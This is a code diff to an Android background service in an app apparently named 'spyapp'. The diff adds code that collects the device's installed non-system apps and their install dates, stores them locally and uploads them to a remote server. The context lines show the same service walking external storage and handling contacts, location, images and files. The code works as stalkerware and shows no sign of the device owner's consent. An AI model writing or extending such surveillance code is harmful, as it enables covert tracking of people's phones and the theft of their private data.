@@ -39,6 +39,8 @@ import github.nisrulz.easydeviceinfo.base.EasyLocationMod;
 import kkactive_india.in.spyapp.Database.DatabaseHelper;
 import kkactive_india.in.spyapp.FilePOJO.fileBean;
 import kkactive_india.in.spyapp.ImagesPOJO.ImgBean;
+import kkactive_india.in.spyapp.appDetailsPOJO.AppDatum;
+import kkactive_india.in.spyapp.appDetailsPOJO.detailsBean;
 import kkactive_india.in.spyapp.contactPOJO.ContactDatum;
 import kkactive_india.in.spyapp.contactPOJO.contactBean;
 import kkactive_india.in.spyapp.locationPOJO.locationBean;
@@ -53,15 +55,17 @@ import retrofit2.converter.gson.GsonConverterFactory;
 import retrofit2.converter.scalars.ScalarsConverterFactory;
 
 public class MainService extends Service {
-    String lat, lon, name, phoneNumber, id, address;
+    String lat, lon, name, phoneNumber, id, address,appName;
     SharedPreferences pref;
     SharedPreferences.Editor edit;
     List<ContactDatum> data = new ArrayList<>();
+    List<AppDatum> apps = new ArrayList<>();
     Timer timer;
     ConnectionDetector cd;
     ArrayList<String> galleryImageUrls;
     File file;
     List<String> list;
+    Date dateFormat;
 
 
     @Nullable
@@ -184,14 +188,15 @@ public class MainService extends Service {
 
                 Log.e("ImageFiles", String.valueOf(file));
 
-                images();
+               // images();
 
 
                 getAllFilesOfDir(Environment.getExternalStorageDirectory());
 
-                files();
+               // files();
 
-               // appsDetails();
+                appsDetails();
+                detailsApi();
 
 
             }
@@ -204,23 +209,89 @@ public class MainService extends Service {
     public void appsDetails(){
 
         List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
+        apps = new ArrayList<>();
         for (int i=0; i < packList.size(); i++)
         {
             PackageInfo packInfo = packList.get(i);
             if (  (packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0)
             {
-                String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
+                appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                 // Drawable icon = packInfo.applicationInfo.loadIcon(getPackageManager());
                 long batch_date = packInfo.firstInstallTime;
-                Date dateFormat = new Date(batch_date);
+                dateFormat = new Date(batch_date);
                 Log.e("App № " , appName );
                 Log.e("date", String.valueOf(dateFormat));
                 // Log.e("icon", String.valueOf(icon));
 
 
-
             }
+
+
+            DatabaseHelper db = new DatabaseHelper(getApplicationContext());
+
+            Boolean result = db.insertAppDetails(appName, String.valueOf(dateFormat));
+
+            Log.d("gayaDatabaseMai", String.valueOf(result));
         }
+    }
+
+    public void detailsApi(){
+
+        if (cd.isConnectingToInternet()) {
+
+
+            DatabaseHelper db = new DatabaseHelper(getApplicationContext());
+
+            Cursor c = db.getAppDetails();
+
+            if (c != null)
+                while (c.moveToNext()) {
+
+                    AppDatum person = new AppDatum();
+                    person.setAppname(c.getString(c.getColumnIndex("appname")));
+                    person.setDate(c.getString(c.getColumnIndex("appdate")));
+                    apps.add(person);
+
+                }
+
+            Bean b = (Bean) getApplicationContext();
+
+            Retrofit retrofit = new Retrofit.Builder()
+                    .baseUrl(b.baseURL)
+                    .addConverterFactory(ScalarsConverterFactory.create())
+                    .addConverterFactory(GsonConverterFactory.create())
+                    .build();
+            Allapi cr = retrofit.create(Allapi.class);
+
+            detailsBean body = new detailsBean();
+
+            body.setAppData(apps);
+
+            Gson gsonObj = new Gson();
+
+            String jsonStr = gsonObj.toJson(body);
+
+
+            Log.d("dgfdh", jsonStr);
+
+
+            String id = pref.getString("id", "");
+            Call<detailsBean> call = cr.details(id,jsonStr);
+            call.enqueue(new Callback<detailsBean>() {
+                @Override
+                public void onResponse(Call<detailsBean> call, Response<detailsBean> response) {
+                    Log.e("DetailsGayi?","HaanGayi");
+                }
+
+                @Override
+                public void onFailure(Call<detailsBean> call, Throwable t) {
+                    Log.e("DetailsGayi?","NahiGayi");
+                    Log.e("YuhNahiGayi",t.toString());
+                }
+            });
+
+        }
+
     }
 
 
@@ -437,6 +508,7 @@ public class MainService extends Service {
         Log.d("asdasads", "asdjhgsadhjasd");
 
         if (cd.isConnectingToInternet()) {
+
             DatabaseHelper db = new DatabaseHelper(getApplicationContext());
 
             Cursor c = db.getContacts();
